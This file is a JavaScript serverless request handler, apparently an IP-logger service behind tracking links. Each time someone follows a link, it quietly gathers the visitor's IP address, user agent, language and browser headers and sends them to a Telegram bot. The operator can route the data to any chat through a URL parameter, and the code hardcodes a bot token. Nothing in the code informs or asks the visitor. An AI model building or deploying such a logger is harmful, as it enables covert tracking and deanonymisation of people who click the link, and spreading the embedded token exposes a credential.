export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const token = '8486936966:AAHaDit7xT6HT6I13C-U-CjAh-m4PMenqYo';
    const defaultChatId = '8382514971';
    
    // Получаем chat_id из query параметра
    let chatId = defaultChatId;
    try {
      const referer = req.headers.referer || req.headers.origin || '';
      if (referer) {
        const urlParams = new URL(referer).searchParams;
        const tgParam = urlParams.get('tg');
        if (tgParam) {
          chatId = tgParam;
        }
      }
    } catch (e) {
      // Используем дефолтный chatId
    }
    
    // Получаем IP пользователя
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               'Unknown';
    
    // Собираем 10 различных данных
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const accept = req.headers['accept'] || 'Unknown';
    const connection = req.headers['connection'] || 'Unknown';
    const cacheControl = req.headers['cache-control'] || 'Unknown';
    const secFetchDest = req.headers['sec-fetch-dest'] || 'Unknown';
    const secFetchMode = req.headers['sec-fetch-mode'] || 'Unknown';
    const secFetchSite = req.headers['sec-fetch-site'] || 'Unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'Unknown';
    const host = req.headers['host'] || 'Unknown';
    
    // Формируем сообщение для Telegram
    const message = `
🔔 Новый переход по ссылке!

🖥️ IP: ${ip}
🌐 Host: ${host}

📱 User Agent: ${userAgent}

Другие данные.. 

🗣️ Language: ${acceptLanguage}
✅ Accept: ${accept}
📱 Browser: ${secChUa}

ℹ️ Вечная ссылка на бота: faidiksearch.xyz
    `.trim();

    // Отправляем сообщение в Telegram
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    res.status(200).json({ success: true });

  } catch (error) {
    res.status(200).json({ success: false });
  }
}
